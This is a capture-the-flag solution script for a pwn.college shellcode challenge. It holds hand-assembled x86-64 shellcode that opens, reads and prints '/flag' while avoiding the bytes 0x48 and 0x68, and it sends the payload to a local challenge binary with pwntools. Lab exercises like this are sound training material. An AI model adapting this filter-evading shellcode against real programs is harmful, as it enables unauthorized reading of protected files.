# the related url is https://pwn.college/program-security/program-security/


shellcode = b""
# Build "/flag"
shellcode += b"\x31\xc0"  # xor eax, eax
shellcode += b"\x50"  # push rax
shellcode += b"\xc6\x04\x24\x2f"  # mov byte [rsp], 0x2f
shellcode += b"\xc7\x44\x24\x01\x66\x6c\x61\x67"  # mov dword [rsp+1], "flag"

# open(rsp, 0, 0)
shellcode += b"\x54"  # push rsp
shellcode += b"\x5f"  # pop rdi
shellcode += b"\x31\xf6"  # xor esi, esi
shellcode += b"\x31\xd2"  # xor edx, edx
shellcode += b"\xb0\x02"  # mov al, 2
shellcode += b"\x0f\x05"  # syscall

# read(fd, rsp, 60)
shellcode += b"\x50"  # push rax (fd)
shellcode += b"\x54"  # push rsp (buffer)
shellcode += b"\x5e"  # pop rsi
shellcode += b"\x5f"  # pop rdi
shellcode += b"\xb2\x3c"  # mov dl, 60
shellcode += b"\x31\xc0"  # xor eax, eax
shellcode += b"\x0f\x05"  # syscall

# write(1, rsp, rax)
shellcode += b"\x6a\x01"  # push 1
shellcode += b"\x5f"  # pop rdi
shellcode += b"\x89\xc2"  # mov edx, eax
shellcode += b"\xb0\x01"  # mov al, 1
shellcode += b"\x0f\x05"  # syscall

# exit
shellcode += b"\xb0\x3c"  # mov al, 60
shellcode += b"\x31\xff"  # xor edi, edi
shellcode += b"\x0f\x05"  # syscall

# Verify
assert b"\x48" not in shellcode
assert b"\x68" not in shellcode

# Run
from pwn import *

io = process("/challenge/ello-ackers")
io.send(shellcode)
io.interactive()
